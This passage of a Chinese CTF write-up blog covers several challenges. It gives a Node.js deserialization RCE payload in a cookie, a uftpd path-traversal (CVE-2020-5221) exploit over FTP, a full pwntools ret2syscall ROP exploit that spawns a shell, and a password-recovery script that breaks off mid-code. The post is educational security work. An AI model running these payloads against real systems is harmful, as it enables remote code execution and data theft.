alt="3"></p><p>虽然该漏洞存在EXP，但是尝试后发现并不能得到shell。所以此类问题还是需要一步一步本地搭环境来调试，不能急功近利。通过Docker搭建好本地环境后，通常需要完成几个步骤来测试EXP。首先，直接修改源码来调试注入的命令。对于反序列化漏洞而言，我们首先编辑注入的代码，将其序列化后，再以Base64的形式编码生成目标的Cookie字符串。</p><p>当本地环境下可以成功运行后，再通过修改请求报文的Cookie，尝试是否可以成功执行拿到Shell。实验后发现，本地搭建的环境确实可以反弹shell,但是目标环境下总是不能成功。因此，我猜想目标服务器的防火墙Drop禁止了除80端口以外的其他连接，也就无法反弹Shell。</p><p>既然SHELL拿不到，如果可以将flag.txt的内容回显到页面上也是可行的，毕竟通过网站源码我们知道flag.txt的地址。所以，我最后修改执行的命令使得flag字符串写入到index.pug文件里，然后触发反序列化漏洞后，再次请求该页面(此时注入的命令已经执行，index.pug被追加了flag字符串)即可看到flag的内容啦。</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> payload <span class="token operator">=</span> '<span class="token punctuation">&#123;</span> <span class="token function-variable function">rce</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">'cat /app/flag'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">error<span class="token punctuation">,</span> stdout<span class="token punctuation">,</span> stderr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">var</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> fs<span class="token punctuation">.</span><span class="token function">appendFile</span><span class="token punctuation">(</span><span class="token string">'/app/views/index.pug'</span><span class="token punctuation">,</span> <span class="token string">'  p '</span><span class="token operator">+</span>stdout<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span>'<span class="token punctuation">;</span><span class="token keyword">var</span> payload <span class="token operator">=</span> serialize<span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> payload <span class="token operator">=</span> payload<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> payload<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'()'</span> <span class="token operator">+</span> payload<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>payload<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> payload<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> payload <span class="token operator">=</span> Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>## <span class="token constant">EXPOLIT</span><span class="token keyword">var</span> cookieValue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Buffer</span><span class="token punctuation">(</span><span class="token function">escape</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> userInfo <span class="token operator">=</span> serialize<span class="token punctuation">.</span><span class="token function">unserialize</span><span class="token punctuation">(</span>cookieValue<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/HKgkKtMAku6jLCyAE9ysWw.png" alt="4"></p><h3 id="3-3-BILLBOARD-MAYHEM"><a href="#3-3-BILLBOARD-MAYHEM" class="headerlink" title="3-3 BILLBOARD MAYHEM"></a><strong>3-3 BILLBOARD MAYHEM</strong></h3><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a><strong>Pwn</strong></h2><h3 id="1-3-FACTORY-RESET"><a href="#1-3-FACTORY-RESET" class="headerlink" title="1-3 FACTORY RESET"></a><strong>1-3 FACTORY RESET</strong></h3><p>这是一道Linux下利用Web服务的漏洞拿站的题目，类似于渗透测试。</p><p>首先官方给出的VPN密钥远程连接至其内网，使得可以访问到目标主机10.6.0.100.</p><p>我们首先使用nmap对其进行端口扫描，使用-Pn参数默认目标主机存活且无需DNS域名解析。结果可以看到该主机打开了ssh的22号端口以及ftp的21号端口。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/7YdUtZL_wecmh6dzPiz-wA.png" alt="5"></p><p>接着，我们继续查看ssh和ftp服务的版本信息。这里使用nmap的-A参数即可。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/WdBYRz5hgE5nsb2bQpNnCw.png" alt="6"></p><p>通过结果我们可以看到该ftp服务使用的是uftpd(2.10)而且允许anonymous匿名用户登陆，ftp的可访问目录下存在着三个bash文件。</p><p>顺着思路，我们直接使用nc来连接该ftp端口且使用匿名用户身份登陆。</p><p>​<img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/8bCHHqLj6mUsSWa5ng7C2w.png" alt="7"></p><p>这个时候我继续尝试一些命令如LIST PWD等发现并没有反应，这个的主要原因是ftp协议是带外传输的，也就是说命令连接和数据连接是两个不同的TCP链接。因此我使用其他的ftp链接工具（fileZilla）去连接，并访问得到了这三个bash文件，结果这三个文件并没有什么值得注意的地方。</p><p>此时，我直接去搜索关于uftpd的相关信息，发现uftpd作为开源的ftp服务器已经更新到2.15版本，而目标机器停留在了2.10版本。接着，我找到了关于uftpd的相关漏洞，其中CVE-2020-5221路径穿越漏洞引起了我的注意，毕竟路径穿越就可以找到题目所说的敏感的stolen_data。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image(6).png" alt="8"></p><p>根据，<a href="https://arinerron.com/blog/posts/6">此博客</a>提供的POC，我们发现FTP中的若干命令(LIST, RETR)都存在路径穿越的漏洞。不过，回到之前的问题，作为带外传输的FTP协议，我们需要另外建立一个链接来传输数据。这有两种方式，默认为主动连接，即由服务器端主动连接客户端的某个端口，这需要首先使用PORT命令提供客户端开放的端口。但是由于服务器端无法穿越NAT直接连接到我的kali，所以我该用被动链接的方式，也就是由客户端主动连接到服务器中作为数据发送的端口。具体如下所示。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image(7).png" alt="9">需要说明的是，PASV使得ftp进入被动模式，给出的10,6,0,100,202,9的含义是开放10.6.0.100:202*256+9端口作为数据传输。所以我是用nc远程连接其51271端口。接着在passwd中我发现存在/var/backups目录，继续使用LIST该目录发现其中存在./DATA/flag1.txt文件。欣喜若狂，至此斩获一150分的大题。</p><pre class="line-numbers language-none"><code class="language-none">CTF&#123;F0rtREss_Br3@c#3d&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-2-ROP-THE-AI"><a href="#4-2-ROP-THE-AI" class="headerlink" title="4-2 ROP THE AI"></a><strong>4-2 ROP THE AI</strong></h3><p>经典的一道ret2syscall的栈溢出题目。</p><p>首先拿到程序查看其基本信息，发现这是一个静态编译的小端的x86-64位程序。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/sqQNwBMtQXgHCWu2mqwXaw.png" alt="10">     </p><p>接着，使用反汇编一下查看其程序逻辑。发现程序逻辑非常简单，main函数中直接调用名为vuln的函数。而在vuln的函数中，首先声明了一个0x70大小的内存空间，接着使用gets()函数获取用户输入存在此内存空间。所以显然栈溢出漏洞就存在于此。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image(8).png" alt="11"></p><p>要对漏洞进行利用，我们还需要知道程序所开启的保护。使用gdb-peda中自带的checksec或者下载的checksec脚本可以帮助我们查看该程序开启的保护措施。由下可见，ROPtheAI开启了Canary以及NX。简单来说，前者在弹栈前检查EBP下方的预置的Cookie是否被用户输入覆盖来判断是否存在栈溢出的情况。后者使得Data段(也就是栈所在的段)不具备执行权限，也就是说用户如果在栈中输入了shellcode也是无法执行的。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/D95JF6Hrh1qZ0ddOl9PP6w.png" alt="12"></p><p>checksec脚本的原理是依赖于readelf工具查看目标程序(ELF，可执行可链接文件格式)的相关信息比如program headers(存储着程序Segment和Section的信息)、符号表(存储着程序中变量、函数名的类型、位置地址等)等。具体地，checksec对于Canary以及NX保护措施的查看方法如下所示，前者是查询符号表中是否存在__stack_chk_fail函数，后者是查询栈的执行权限。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image(9).png" alt="13"></p><p>这种判断Canary的方法我们可以猜想会存在假阳性，毕竟存在__stack_chk_fail函数并其不意味着被链接进去。所以具体的情况我们还是要通过动态调试程序来看是否在程序的入口和弹栈时存在对应的汇编代码。这里可以参考<a href="https://ctf-wiki.org/pwn/linux/user-mode/mitigation/canary/">CTFWiki</a>中对于Canary的具体讲解。本ROPtheAI就是这样一个例子，在调试时并没有发现有执行验证Cookie的汇编代码，所以我们无需思考如何绕过Canary。</p><p>对于NX，在动态调试时可以通过vmmap查看栈是否存在可执行的权限。</p><p> <img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image(10).png" alt="14"></p><p>在摸清程序的保护措施之后，我们首先通过动态调试查看栈的结构，确定缓冲区的大小；然后构造ROP链绕过NX保护。</p><p>程序的栈结构以及入栈出栈的过程可以参考<a href="https://www.cnblogs.com/clover-toeic/p/3755401.html">此篇文章</a>，介绍的非常细致。缓冲区的大小我们可以通过动态调试时查看RSP和RBP所指向的地址查看或者通过cyclic工具构造有规律的字符串，再判断溢出后RBP中所存储的内容判断偏移。由于本程序的汇编非常简单，通过调试我们可以看到栈中保存RET地址的位置距离输入点的偏移的0x70。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image(11)-9054164.png" alt="15"></p><p>由于NX保护的开启，我们无法通过最简单的利用gets函数在栈中嵌入一段shellcode，再将ret的地址指向该shellcode的地址，使其执行shellcode。因为存入的shellcode在data段中的栈中，该地址的指令与在text段中的指令不同，没有执行权限。</p><p>但是ROP技术可以避开此限制，成功突破NX保护。ROP(Return Oriented Programming)技术，是在栈缓冲区溢出的基础上，利用程序中已有的存在ret命令的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。其核心是利用了指令集中的 ret 指令，改变了指令流的执行顺序。</p><p>绕过NX有四种常用的方式：ret2text, ret2shellcode, ret2syscall, 以及ret2libc。第一种方式是比较直接，在程序中查找执行system(‘/bin/sh’)的指令，并将其指令地址覆盖到栈中的ret位置。但是通常来讲，程序中可能并不会在这样的指令。第二种方式是通过write方法将shellcode写入.bss段(通常存放着全局变量，具有可执行权限)，然后再将其写入地址存放于ret位置。第三种方式是利用系统调用(32位程序是int 0x80，64位程序是syscall)并修改寄存器使得执行exceve(‘/bin/sh’,0x0,0x0)系统调用。最后一种方式是对于动态链接的程序，利用存储在glibc(GNC的标准C语言库)中的system函数，执行system(‘/bin/sh’).</p><p>此时，我们需要根据程序中提供的gadgets来选择使用那种方法。查看程序的gadgets我们可以使用ROPgadget工具。使用<code>ROPgadget --binary ~/Desktop/ROPtheAI/ROPtheAI | grep syscall</code> 命令我们可以发现程序中存在非常好利用的系统调用，所以我们选择使用ret2syscall的方式利用该漏洞。                 <img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/zayfkMQ1IrSUZOfB7QsdzQ.png" alt="16"></p><p>为了执行exceve系统调用，我们需要使rax的值置为0x3b，表示exceve系统调用的编号；rdi的值置为字符串”/bin/sh\x00”的地址，注意字符串的结尾必须是0x00；rsi和rdx的值为0x00即可。因此我们需要在程序中查找gadgets来构造ROP链，使得执行系统调用时寄存器的值到位。</p><p>接着，我们在全局查找”/bin/sh”字符串，发现并没有该字符串。因此，我们需要利用gadgets向.bss段写入该字符串。首先，我们可以找到操纵rax和rdx的指令，接着我们找一个可以读写的.bss的地址，然后利用类似于mov [rdx], rax；的指令来将字符串写入该地址。具体如下所示。我们找到非常好的写入内存的指令，首先字符串’/bin/sh\x00’正好是8字节，也就是正好放入rax寄存器中，然后rdx置为待写入的地址，然后利用mov qword ptr[rdx], rax指令表示将rax的值放入以rdx的值作为地址的大小为双字(16字节显然足够)的内存中。此payload执行完，我们已将’/bin/sh’写入到地址为0x004b72e0的内存中。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">pop_rax <span class="token operator">=</span> <span class="token number">0x0044c043</span> <span class="token comment"># pop rax; ret;</span>pop_rdx <span class="token operator">=</span> <span class="token number">0x004016eb</span> <span class="token comment"># pop rdx; ret;</span>writeable_memory_addr <span class="token operator">=</span> <span class="token number">0x004b72e0</span> <span class="token comment"># bss段内地址</span>write_memory <span class="token operator">=</span> <span class="token number">0x0043e353</span> <span class="token comment"># mov qword ptr[rdx], rax; mov rax, rdi; ret</span>payload <span class="token operator">=</span> <span class="token number">120</span><span class="token operator">*</span><span class="token string">b'A'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rax<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'/bin/sh\x00'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdx<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>writeable_memory_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>write_memory<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接着，我们只需重新调整寄存器的值并调用syscall即可。完整的EXP如下所示，我使用了一次可以设置三个寄存器值的指令，最后调整rdi为writeable_memory_addr，最后ret系统调用。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>context<span class="token punctuation">.</span>endian <span class="token operator">=</span> <span class="token string">'little'</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'/home/kali/Desktop/ROPtheAI/ROPtheAI'</span><span class="token punctuation">)</span><span class="token comment"># sh = remote("xxx.xxx.xxx.xxx",17004)</span><span class="token comment"># sh = gdb.debug('/home/kali/Desktop/ROPtheAI/ROPtheAI', gdbscript="""</span><span class="token comment"># b vuln</span><span class="token comment"># continue</span><span class="token comment"># """)</span>pop_rax_rdx_rbx <span class="token operator">=</span> <span class="token number">0x00479906</span>pop_rax <span class="token operator">=</span> <span class="token number">0x0044c043</span>pop_rsi <span class="token operator">=</span> <span class="token number">0x004087ce</span>pop_rdi <span class="token operator">=</span> <span class="token number">0x00401931</span>pop_rdx <span class="token operator">=</span> <span class="token number">0x004016eb</span>syscall <span class="token operator">=</span> <span class="token number">0x004011fa</span>writeable_memory_addr <span class="token operator">=</span> <span class="token number">0x004b72e0</span> <span class="token comment"># bss段内地址</span>write_memory <span class="token operator">=</span> <span class="token number">0x0043e353</span> <span class="token comment"># mov qword ptr[rdx], rax; mov rax, rdi; ret</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'Please enter your preferred configuration:'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token number">120</span><span class="token operator">*</span><span class="token string">b'A'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rax<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'/bin/sh\x00'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdx<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>writeable_memory_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>write_memory<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rax_rdx_rbx<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x3b</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rsi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>writeable_memory_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终成功拿到Shell。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image(12).png" alt="17"></p><p>最后，其实在整个EXP编写的过程中并不会顺利，所以需要我们使用pwntools自带的gdb来调试我们的payload，查看问题出在哪里再修复，这一点非常重要。此外，通过gdb.debug的方式启用程序可能会由于环境变量，导致栈的内存地址的变化。通过gdb.attach的方式连接已经运行的程序则不会存在这样的问题。</p><h2 id="Reversing"><a href="#Reversing" class="headerlink" title="Reversing"></a><strong>Reversing</strong></h2><h3 id="3-1-CRACK-THE-PASSWORD"><a href="#3-1-CRACK-THE-PASSWORD" class="headerlink" title="3-1 CRACK THE PASSWORD"></a><strong>3-1 CRACK THE PASSWORD</strong></h3><p>改题目提供了一个二进制的文件，用十六进制观察之后，发现师ELF文件。使用IDA反编译之后，发现该程序存在验证密码是否正确的函数。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/1R8m6flUkhQITA5wzgsFgw.png" alt="18"></p><p>进入validatePassword之后，发现函数的主要逻辑是验证输入字符串的长度和不同位置之间的关系(根据 特定位置字符的十进制表示来确定关系)。仔细观察之后，发现字符串中存在某些可以确定的字符，如a1[13] = 49 （刚好对应数字1），然后通过这些确定的字符，可以将其他的字符确定下来。最后通过编程将整个字符串解密出来。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/AKOl2mA8sMQQB2s149gWtA.png" alt="19"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">password <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token boolean">None</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">33</span>password<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">49</span><span class="token punctuation">)</span><span class="token punctuation">;</span>password<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">57</span><span class="token punctuation">)</span><span class="token punctuation">;</span>password<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token number">0x61</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">29</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token number">0xA</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token comment">#?</span>password<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">19</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token number">0x40</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">40</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token number">7</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">19</span><span class="token 